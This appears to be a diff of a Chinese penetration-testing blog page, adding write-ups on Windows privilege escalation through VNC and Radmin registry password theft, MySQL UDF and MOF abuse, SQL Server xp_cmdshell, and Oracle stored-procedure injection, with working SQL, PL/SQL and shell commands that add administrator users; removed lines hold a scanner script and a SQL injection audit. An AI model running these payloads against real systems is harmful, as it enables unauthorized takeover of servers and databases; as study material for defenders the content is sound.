+<p>（3）连接pcAnywhere服务端<br>拿到用户密码后使用客户端连接对pcAnywhere服务端进行连接，之后就和对本地计算机进行操作一样。</p>
+<p>详情参考：<a href="https://blog.csdn.net/God_XiangYu/article/details/99699638" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99699638</a></p>
+<h4 id="第三方软件VNC提权"><a href="#第三方软件VNC提权" class="headerlink" title="第三方软件VNC提权"></a>第三方软件VNC提权</h4><h5 id="VNC简介"><a href="#VNC简介" class="headerlink" title="VNC简介"></a>VNC简介</h5><p>VNC (Virtual Network Console)是虚拟网络控制台的缩写。它 是一款优秀的远程控制工具软件，由著名的 AT&amp;T 的欧洲研究实验室开发的。</p>
+<h5 id="提权思路"><a href="#提权思路" class="headerlink" title="提权思路"></a>提权思路</h5><p>安装VNC后会<code>在注册表中保留VNC的密码</code>，通过WEBSHELL远程读取注册表中的密码信息并在本地破解VNC密码进行远程连接来达到提权目的。</p>
+<h5 id="提权步骤-1"><a href="#提权步骤-1" class="headerlink" title="提权步骤"></a>提权步骤</h5><p><strong>1、通过读取注册表十进制数</strong><br>（1）RealVNC的注册表路径：</p>
+<pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4\Password</code></pre><p>（2）UltraVNC的注册表路径：</p>
+<pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\ORL\WinVNC3\Default\password</code></pre><p><strong>2、转换成十六进制数</strong><br>在线转换进制地址链接：<a href="https://www.toolfk.com/tool-convert-hexadecimal" target="_blank" rel="noopener">https://www.toolfk.com/tool-convert-hexadecimal</a></p>
+<p><strong>3、破解十六进制数得到密码</strong><br>使用工具VNC4X进行破解<br>先在CMD输入<code>vncx4.exe -W</code>回车<br>然后将转换后的十六进制挨个输入，每输入一个都按一次回车</p>
+<p><strong>4、使用获取到的账号密码连接vnc</strong><br>通过本地的VNC客户端，连接成功后远程操作实现提权</p>
+<p>详情参考：<a href="https://blog.csdn.net/God_XiangYu/article/details/99711913" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99711913</a></p>
+<h4 id="第三方软件Radmin提权"><a href="#第三方软件Radmin提权" class="headerlink" title="第三方软件Radmin提权"></a>第三方软件Radmin提权</h4><h5 id="Radmin简介"><a href="#Radmin简介" class="headerlink" title="Radmin简介"></a>Radmin简介</h5><ul>
+<li>Radmin是平时在windows下用的比较多的一个远程管理工具。其具有支持多个连接和IP 过滤(即允许特定的IP控制远程机器)、个性化的档互传、远程关机、支持高分辨率模式、基于Windows NT的安全支持及密码保护以及提供日志文件支持等特性。</li>
+<li>默认开放 <code>4899</code>端口</li>
+<li>Radmin server2.X、Radmin server3.0都存在一个“致命”漏洞 —— radmin hash提权漏洞</li>
+</ul>
+<h5 id="提权思路-1"><a href="#提权思路-1" class="headerlink" title="提权思路"></a>提权思路</h5><p>老版本的Radmin会<code>在注册表中保留密码的Hash值</code>，通过WEBSHELL、远程挂马读取注册表中的密码Hash值并在本地破解密码进行远程连接来达到提权目的。</p>
+<h5 id="提取步骤"><a href="#提取步骤" class="headerlink" title="提取步骤"></a>提取步骤</h5><p><strong>1、获取MD5Hash值</strong></p>
+<pre><code>HKEY_LOCAL_MACHINESYSTEMRAdminv2.0ServerParametersParameter//默认密码注册表位置
+HKEY_LOCAL_MACHINESYSTEMRAdminv2.0ServerParametersPort //默认端口注册表位置</code></pre><p><strong>2、使用RadminHash进行登录</strong><br>在<code>Radmin-Hash</code>客户端输入RAdmin客户端的Hash值即可登录。<br>然后在Radmin-Hash客户端新建服务端，输入所要连接的<code>IP</code>或者扫描存活主机进行连接</p>
+<p><strong>3、查看远程屏幕</strong></p>
+<p>在Radmin客户端选择屏幕控制，输入Hash值即可查看远程主机屏幕。</p>
+<p><strong>4、获取并破解密码</strong><br>用mimikatz解析用户密码，也可以通过上传getpw.exe文件获取用户的sam值，再通过LC5解密。</p>
+<p><strong>5、登录远程桌面</strong></p>
+<p>在本地打开远程桌面连接器，输入远端IP进行登录。</p>
+
           
         
       
@@ -517,7 +1755,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/" itemprop="url">渗透测试中常见提权方式总结(二)</a></h1>
+                <a class="post-title-link" href="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/" itemprop="url">windows渗透测试中常见提权方式总结(二)</a></h1>
         
 
         <div class="post-meta">
@@ -569,7 +1807,7 @@
       
         
           
-            <h4 id=""><a href="#" class="headerlink" title=""></a></h4><h2 id="提权总结之各种数据库提权方法总结"><a href="#提权总结之各种数据库提权方法总结" class="headerlink" title="提权总结之各种数据库提权方法总结"></a>提权总结之各种数据库提权方法总结</h2><h3 id="mysql之UDF提权"><a href="#mysql之UDF提权" class="headerlink" title="mysql之UDF提权"></a>mysql之UDF提权</h3><h4 id="原理分析："><a href="#原理分析：" class="headerlink" title="原理分析："></a>原理分析：</h4><p>​        <strong>UDF</strong>(user-defined function)是MySQL的一个拓展接口，也可称之为<strong>用户自定义函数</strong>，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。</p>
+            <h2 id="渗透测试中常见提权方式总结（一）"><a href="#渗透测试中常见提权方式总结（一）" class="headerlink" title="渗透测试中常见提权方式总结（一）"></a>渗透测试中常见提权方式总结（一）</h2><h3 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h3><h4 id="mysql之UDF提权"><a href="#mysql之UDF提权" class="headerlink" title="mysql之UDF提权"></a>mysql之UDF提权</h4><h4 id="原理分析："><a href="#原理分析：" class="headerlink" title="原理分析："></a>原理分析：</h4><p>​        <strong>UDF</strong>(user-defined function)是MySQL的一个拓展接口，也可称之为<strong>用户自定义函数</strong>，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。</p>
 <p>​    <strong>动态链接库</strong>：是把程序代码中会使用的函数编译成机器码，不过是保存在.dll文件中。另外在编译时，不会把函数的机器码复制一份到可执行文件中。编译器只会在.exe的执行文件里，说明所要调用的函数放在哪一个*.dll文件。程序执行使用到这些函数时，操作系统会把dll文件中的函数拿出来给执行文件使用</p>
 <p>​    <strong>udf是Mysql类提权的方式之一</strong>。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。</p>
 <h4 id="提权常见手法："><a href="#提权常见手法：" class="headerlink" title="提权常见手法："></a>提权常见手法：</h4><p>一般来说使用udf提权的常规手法：</p>
@@ -583,9 +1821,9 @@
 <li><p>利用SQLMAP中的-d参数连接远程数据库，自动上传so库完成UDF提权，从而获取os-shell</p>
 </li>
 <li><p>使用Navicat等数据库管理工具连接远程数据库，从而完成UDF提权。</p>
+<p>其实这些手法的主要目的都是<strong>想方设法登陆数据库服务来执行SQL语句，进而获取到启动MySQL服务的root权限，</strong></p>
 </li>
 </ul>
-<p>  其实这些手法的主要目的都是<strong>想方设法登陆数据库服务来执行SQL语句，进而获取到启动MySQL服务的root权限，</strong></p>
 <h4 id="提权的一些前提："><a href="#提权的一些前提：" class="headerlink" title="提权的一些前提："></a>提权的一些前提：</h4><p>利用udf提权有一些利用的先决条件：</p>
 <ul>
 <li>MySQL 数据库没有开启安全模式。</li>
@@ -621,7 +1859,10 @@
 <li>如果mysql版本小于5.1，udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录</li>
 </ul>
 <p>但是mysql默认状态下没有这个文件夹，需要我们自行创建。</p>
-<p>我直接在菜刀下创建plugin文件夹</p>
+<p>用NTFS ADS流模式突破进而创建文件夹</p>
+<pre><code>select @@basedir;  //查找到mysql的目录
+select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&#39;;    //利用NTFS ADS创建lib目录
+select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#39;;    //利用NTFS ADS创建plugin目录</code></pre><p>我直接在菜刀下创建plugin文件夹</p>
 <p>然后最关键的一步：<strong>导出UDF文件</strong></p>
 <p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428165018.png" alt=""></p>
 <p>导出后，再次尝试文件已经存在，说明导入成功。</p>
@@ -638,7 +1879,7 @@
 <p>注：这里注意版本，适用于5.5.9以下，</p>
 <h5 id="sqlmap命令"><a href="#sqlmap命令" class="headerlink" title="sqlmap命令"></a>sqlmap命令</h5><p>使用SQLMAP的-d命令来连接服务并执行UDF提权语句；</p>
 <pre><code>sqlmap -d mysql://root:xxxxxx@VPS:3306/mysql --os-shell</code></pre><h3 id="mysql数据库提权之MOF提权"><a href="#mysql数据库提权之MOF提权" class="headerlink" title="mysql数据库提权之MOF提权"></a>mysql数据库提权之MOF提权</h3><h4 id="原理分析：-1"><a href="#原理分析：-1" class="headerlink" title="原理分析："></a>原理分析：</h4><p>利用了<code>c:/windows/system32/wbem/mof/</code>目录下的 <code>nullevt.mof</code> 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。</p>
-<h4 id="提取复现："><a href="#提取复现：" class="headerlink" title="提取复现："></a>提取复现：</h4><p>首先需要具备Mysql的<code>root</code>权限，我们还是使用上面菜刀连接获得的webshell</p>
+<h4 id="提权复现："><a href="#提权复现：" class="headerlink" title="提权复现："></a>提权复现：</h4><p>首先需要具备Mysql的<code>root</code>权限，我们还是使用上面菜刀连接获得的webshell</p>
 <p>然后我们将<code>nullevt.mof</code>导入到一下可写目录</p>
 <p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428185617.png" alt=""></p>
 <p>文件内容：</p>
@@ -669,10 +1910,92 @@ Filter = $EventFilter;
 <p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428190009.png" alt=""></p>
 <p>执行后，到win2003上查看用户：</p>
 <p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428190809.png" alt=""></p>
+<p>之后我们可以将自定义的命令改为：</p>
+<pre><code>net.exe localgroup administrators test /add</code></pre><p>即可对添加的用户进行提权。</p>
 <h4 id="其他mof提权方法："><a href="#其他mof提权方法：" class="headerlink" title="其他mof提权方法："></a>其他mof提权方法：</h4><h5 id="msf-mof提权"><a href="#msf-mof提权" class="headerlink" title="msf mof提权"></a>msf mof提权</h5><p>使用<code>mysql_mof</code>模块，有的版本不能成功，</p>
 <h5 id="上传mof-php"><a href="#上传mof-php" class="headerlink" title="上传mof.php"></a>上传mof.php</h5><p>直接上传mof.php执行命令</p>
 <p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428184713.png" alt=""></p>
 <p>我试了几次都失败了，这里应该需要开启mysql远程连接的功能。。。。</p>
+<h4 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h4><p>​        Mysql Root权限MOF方法提权其前提条件是能够将上传的nullevt.mof复制到系统目录下，例如c:\windows\system32\wbem\mof中，如果无法复制则会提权失败。一般对Windows2003以下操作系统效果较好，Windows2008以上由于保护机制，较少能够成功。因此可以采取以下措施进行防范：</p>
+<ul>
+<li>在程序数据库连接文件中尽量不要使用Root帐号进行连接。</li>
+<li>Root帐号使用强加密方式，采用字母大小写+数字+特殊字符，密码位数15位以上。</li>
+<li>对Mysql数据库的mysql数据库目录权限严格限制，IIS用户无法读写该文件。</li>
+</ul>
+<h3 id="SQL-Server提权"><a href="#SQL-Server提权" class="headerlink" title="SQL  Server提权"></a>SQL  Server提权</h3><h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p><img src="https://img-blog.csdnimg.cn/20190611101318911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg0NTA0,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>xp_cmdshell是Sql Server中的一个组件，我们可以用它来执行系统命令。</p>
+<h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p><strong>利用前提：</strong></p>
+<ul>
+<li>getshell或者存在sql注入并且能够执行命令</li>
+<li>sql server是system权限，sql server默认就是system权限。</li>
+<li>获取SA用户口令</li>
+</ul>
+<h5 id="获取SA用户口令方法"><a href="#获取SA用户口令方法" class="headerlink" title="获取SA用户口令方法"></a>获取SA用户口令方法</h5><ul>
+<li>Webshell或源码获取，一般在网站的配置文件中有存放明文账号密码，常用配置文件名如：</li>
+</ul>
+<pre><code>conn.aspx
+config.aspx
+config.php
+web.config
+.........
+
+一般格式如：
+
+server=localhost;
+UID=sa;
+PWD=shadowflow</code></pre><p>获得sa口令，即可通过我们上传的大马进行登录，获得sa相应权限</p>
+<p>有了xp_cmdshell的话可以执行系统命令，该组件默认是关闭的，因此需要把它打开。</p>
+<h5 id="开启xp-cmdshell"><a href="#开启xp-cmdshell" class="headerlink" title="开启xp_cmdshell"></a>开启xp_cmdshell</h5><pre><code>exec sp_configure &#39;show advanced options&#39;, 1;reconfigure;
+exec sp_configure &#39;xp_cmdshell&#39;,1;reconfigure;</code></pre><h5 id="关闭xp-cmdshell"><a href="#关闭xp-cmdshell" class="headerlink" title="关闭xp_cmdshell"></a>关闭xp_cmdshell</h5><pre><code>exec sp_configure &#39;show advanced options&#39;, 1;reconfigure;
+exec sp_configure &#39;xp_cmdshell&#39;, 0;reconfigure</code></pre><h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><pre><code>exec master..xp_cmdshell &#39;net user test pinohd123. /add&#39;    添加用户test，密码test
+exec master..xp_cmdshell &#39;net localgroup administrators test add&#39;    添加test用户到管理员组</code></pre><h3 id="Oracle数据库提权之注入存储过程提权"><a href="#Oracle数据库提权之注入存储过程提权" class="headerlink" title="Oracle数据库提权之注入存储过程提权"></a>Oracle数据库提权之注入存储过程提权</h3><h4 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h4><p>SYS创建的存储过程存在sql注入。拥有<code>create procedure</code>权限的用户通过创建提权函数，将提权函数注入到存储过程中，于是该存储过程将调用这个提权函数来执行<code>grant dba to quan</code>命令，获得<strong>Oracle数据库dba权限</strong>。</p>
+<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
+<li>SYS创建的存储过程<code>存在sql注入</code>（EG：CVE-2005-4832）</li>
+<li>用户拥有<code>create procedure</code>权限（用来创建函数）</li>
+</ul>
+<h4 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h4><p>假设有一个用户quan 只有 CONNECT 和 RESOURCE 权限</p>
+<h5 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h5><ul>
+<li>用户登陆后执行<code>select * from session_privs</code>查看权限</li>
+<li>创建函数，命令为<code>grant dba to quan</code></li>
+</ul>
+<p>grant execute on pwn to public;//赋予所有用户此函数的执行权限</p>
+<pre><code>SQL&gt;create or replace function pwn return vaarchar2
+authid current_user is pragma autonomous_transaction;
+begin
+execute immediate &#39;grant dba to quan&#39;;
+return &#39;&#39;;
+end;
+/
+
+SQL&gt;grant execute on pwn to public;
+/</code></pre><p>注入sys.dbms_cdc_subscribe.activate_subscription</p>
+<pre><code>SQL&gt;begin
+sys.dbms_cdc_subscribe.activate_subscription(&#39;&#39;&#39;||quan.pwn()||&#39;&#39;&#39;);
+end;
+/
+
+SQL&gt;set role dba;</code></pre><p>执行<code>select * from session_privs</code>查看是否为dba权限</p>
+<h5 id="利用MSF注入"><a href="#利用MSF注入" class="headerlink" title="利用MSF注入"></a>利用MSF注入</h5><p>1.加载攻击模块</p>
+<pre><code>use auxiliary/sqli/oracle/dbms_cdc_subscribe.activate_subscription</code></pre><p>2.配置参数</p>
+<pre><code>set dbuser quan
+
+set dbpass quan123
+
+set sid orcl
+
+set rhost xxxxx
+
+set sql grant dba to quan</code></pre><p>3.run</p>
+<h3 id="Oracle数据库提权之通过utl-http-request存储过程提权"><a href="#Oracle数据库提权之通过utl-http-request存储过程提权" class="headerlink" title="Oracle数据库提权之通过utl_http.request存储过程提权"></a>Oracle数据库提权之通过utl_http.request存储过程提权</h3><h4 id="原理分析-2"><a href="#原理分析-2" class="headerlink" title="原理分析"></a>原理分析</h4><p>Oracle9i~11gR2中<code>dbms_xmlquery.newcontext()</code>和<code>dbms_xmlquery.getxml()</code>函数可以执行任意PL/SQL语句，利用这两个函数可以获得Oracle服务器的<strong>操作系统权限</strong>。</p>
+<h5 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
+<li>UTL_HTTP存储过程可用</li>
+<li>Oracle9i~11gR2</li>
+</ul>
+<h4 id="提权步骤-1"><a href="#提权步骤-1" class="headerlink" title="提权步骤"></a>提权步骤</h4><ol>
+<li>创建Java包</li>
+<li>创建存储过程MYJAVACMD</li>
+<li>执行存储过程，成功添加用户</li>
+</ol>
 <h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://xz.aliyun.com/t/7392#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/7392#toc-10</a></p>
 
           
@@ -1979,866 +3302,6 @@ if __name__ == &#39;__main__&#39;:
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/20/python-bian-xie-c-duan-web-mu-lu-sao-miao-gong-ju/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Shu1L">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/header.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/04/20/python-bian-xie-c-duan-web-mu-lu-sao-miao-gong-ju/" itemprop="url">python编写简单C段&web目录扫描工具</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-20T12:41:18+08:00">
-                2020-04-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/python%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
-                    <span itemprop="name">python学习</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="Python编写C段-amp-web目录扫描工具"><a href="#Python编写C段-amp-web目录扫描工具" class="headerlink" title="Python编写C段&amp;web目录扫描工具"></a>Python编写C段&amp;web目录扫描工具</h2><h4 id="python编写目录扫描工具"><a href="#python编写目录扫描工具" class="headerlink" title="python编写目录扫描工具"></a>python编写目录扫描工具</h4><pre><code>import requests
-from optparse import OptionParser
-import threading
-from Queue import Queue
-import sys
-
-class WEB_DIR(threading.Thread):
-    def __init__(self,queue):
-            threading.Thread.__init__(self)
-            self._queue = queue
-    def run(self):
-        while not self._queue.empty():
-            url = self._queue.get()
-            try:
-                headers = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr&#39;}
-                r = requests.get(url, headers=headers, timeout=1)
-            except Exception,e:
-              pass
-            if r.status_code == 200:
-                print &#39;[*]&#39; + url
-
-def start(url,file,count):
-    queue = Queue()
-    f = open(&#39;%s.txt&#39; % file, &#39;r&#39;)
-    for i in f:
-        queue.put(url + i.strip(&#39;\r\n&#39;))
-    threads = []
-    thread_count = int(count)
-    for i in range(thread_count):
-        threads.append(WEB_DIR(queue))
-    for t in threads:
-        t.start()
-    for t in threads:
-        t.join()
-
-def main():
-    parser = OptionParser()
-    parser = OptionParser()
-    parser.add_option(&quot;-u&quot;,&quot;--url&quot;,dest=&quot;url&quot;,help=&quot;Target url for scan&quot;)
-    parser.add_option(&quot;-f&quot;, &quot;--file&quot;, dest=&quot;filename&quot;, help=&quot;Dir filename&quot;)
-    parser.add_option(&quot;-t&quot;, &quot;--thread&quot;, dest=&quot;count&quot;,type=int,default=10, help=&quot;scan thread count&quot;)
-    options,args = parser.parse_args()
-    if options.url and options.filename:
-        start(options.url,options.filename,options.count)
-    else:
-        parser.print_help()
-        sys.exit(1)
-
-if __name__ == &#39;__main__&#39;:
-    main()</code></pre><h4 id="python编写C段扫描工具"><a href="#python编写C段扫描工具" class="headerlink" title="python编写C段扫描工具"></a>python编写C段扫描工具</h4><pre><code>import ipaddr
-import requests
-import threading
-from Queue import Queue
-import sys
-
-
-class C_Scan(threading.Thread):
-    def __init__(self,queue):
-            threading.Thread.__init__(self)
-            self._queue = queue
-    def run(self):
-        while not self._queue.empty():
-            r = 0
-            url = str(self._queue.get())
-            url = &#39;http://&#39;+url
-            try:
-                headers = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr&#39;}
-                r = requests.get(url, headers=headers, timeout=1)
-            except Exception,e:
-                pass
-            if r.status_code == 200:
-                    print &#39;[*]&#39; + url
-def main():
-    if len(sys.argv) != 2:
-        print &#39;Usage: Python %s 192.168.1.1/24&#39;%(sys.argv[0])
-    else:
-        threads = []
-        threadnum = 250
-        queue = Queue()
-        cidrip = sys.argv[1]
-        ips = ipaddr.IPNetwork(cidrip)
-        for ip in ips:
-            queue.put(ip)
-        for i in xrange(threadnum):
-            threads.append(C_Scan(queue))
-        for t in threads:
-            t.start()
-        for t in threads:
-            t.join()
-        print &quot;All Finished!!!&quot;
-
-if __name__ == &#39;__main__&#39;:
-    main()</code></pre>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/19/thinkphp5-kuang-jia-xue-xi/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Shu1L">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/header.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/04/19/thinkphp5-kuang-jia-xue-xi/" itemprop="url">Thinkphp5框架学习</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-19T20:02:09+08:00">
-                2020-04-19
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Shu1L">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/header.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/" itemprop="url">Axublog代码审计学习</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-19T20:00:16+08:00">
-                2020-04-19
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
-                    <span itemprop="name">代码审计学习</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="Axublog代码审计学习"><a href="#Axublog代码审计学习" class="headerlink" title="Axublog代码审计学习"></a>Axublog代码审计学习</h2><h4 id="前台数字型sql注入"><a href="#前台数字型sql注入" class="headerlink" title="前台数字型sql注入"></a>前台数字型sql注入</h4><h5 id="漏洞位置：axublog-hit-php"><a href="#漏洞位置：axublog-hit-php" class="headerlink" title="漏洞位置：axublog/hit.php"></a>漏洞位置：axublog/hit.php</h5><h5 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>hit.php漏洞关键代码：</p>
-<pre><code>&lt;?php
-header(&quot;Content-type:text/html; charset=utf-8&quot;);
-require(&quot;cmsconfig.php&quot;);
-require(&quot;class/c_other.php&quot;);
-sqlguolv();
-
-$g=$_GET[&#39;g&#39;];
-
-
-if ($g==&#39;arthit&#39;){
-$id=$_GET[&#39;id&#39;];        
-    if($id!=&#39;&#39;){
-
-$tab=$tabhead.&quot;arts&quot;;
-mysql_select_db($tab);
-$sql=mysql_query(&quot;UPDATE &quot;.$tab.&quot; SET hit=hit+1 where id=&quot;.$id);  //直接将$_GET[&#39;id&#39;]提取的                                                                      id带入sql查询，没有经过                                                                      有效过滤
